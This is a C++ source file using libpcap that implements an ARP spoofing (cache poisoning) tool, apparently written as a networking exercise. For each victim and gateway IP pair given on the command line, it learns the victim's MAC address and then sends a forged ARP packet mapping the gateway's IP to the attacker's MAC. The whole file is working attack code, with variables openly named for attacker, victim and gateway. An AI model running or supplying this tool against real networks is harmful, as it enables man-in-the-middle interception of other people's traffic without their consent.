#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "custom.h"

#pragma pack(push, 1)
typedef struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
}EthArpPacket;
#pragma pack(pop)

Param param  = {
	.dev_ = NULL
};

EthArpPacket* sendArp(Ip sender_ip, Ip target_ip, Mac send_mac, Mac target_mac){
	EthArpPacket* packet = (EthArpPacket*)malloc(sizeof(EthArpPacket));

	packet->eth_.dmac_ = target_mac;
	packet->eth_.smac_ = send_mac;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(ArpHdr::Request);
	packet->arp_.smac_ = send_mac;
	packet->arp_.sip_ = htonl(sender_ip);
	packet->arp_.tmac_ = target_mac;
	packet->arp_.tip_ = htonl(target_ip);

	return packet;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;
	
	Ip attacker_Ip = Ip(myIp(argv[1]));
	Mac attacker_Mac = Mac(myMac(argv[1]));

	char errbuf[PCAP_ERRBUF_SIZE];	
	pcap_t* handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
		return -1;
	}

	for (int i = 2; i < argc; i += 2){
		Ip sender_Ip = Ip(argv[i]);	 //victim_Mac
		Ip target_Ip = Ip(argv[i+1]); //gateway_Mac
		Mac sender_Mac;	 			 // victim_Mac
		EthArpPacket* sendpacket;

		sendpacket = sendArp(attacker_Ip, sender_Ip, attacker_Mac, Mac("FF:FF:FF:FF:FF:FF"));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(sendpacket), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		free(sendpacket);

		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthHdr* eth = (EthHdr*)(packet);
			ArpHdr* arp = (ArpHdr*)(packet+sizeof(EthHdr));
			if (eth->type() != EthHdr::Arp) continue;
			
			if (Mac(eth->dmac()) == attacker_Mac && Ip(arp->tip()) == attacker_Ip && Ip(arp->sip()) == sender_Ip){
				sender_Mac = Mac(eth->smac());
				break;
			}
		}
		
		sendpacket = sendArp(target_Ip, sender_Ip, attacker_Mac, sender_Mac);
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(sendpacket), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		free(sendpacket);
	}
	
	pcap_close(handle);
}
